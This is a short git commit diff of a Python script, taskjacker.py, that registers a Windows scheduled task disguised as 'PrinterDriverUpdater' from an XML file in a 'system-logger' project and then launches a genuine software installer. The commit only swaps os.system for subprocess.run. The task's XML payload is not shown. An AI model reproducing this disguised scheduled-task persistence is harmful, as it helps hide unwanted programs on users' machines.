72c19746da4d2bd05060b3fab8c849f673a415eb
DevL <53537549+DeveloperLoser@users.noreply.github.com>
2023-02-22 21:21:16 -0500

    Ah

--- taskjacker.py
+++ taskjacker.py
@@ -1,12 +1,13 @@
 from os import system
+from subprocess import run
 
 task = "schtasks /create /TN PrinterDriverUpdater /XML C:/Users/lhill23/Documents/GitHub/system-logger/PrinterDriverUpdater.xml"
 real_installer = "C:/Users/lhill23/Desktop/VEXcodeV5-20220228.exe"
 
 #Hijacking task scheduler, kinda?
 def Hijack():
-    system(task)
-    system(real_installer)
+    run(task)
+    run(real_installer)
 
 if __name__ == "__main__":
     Hijack()
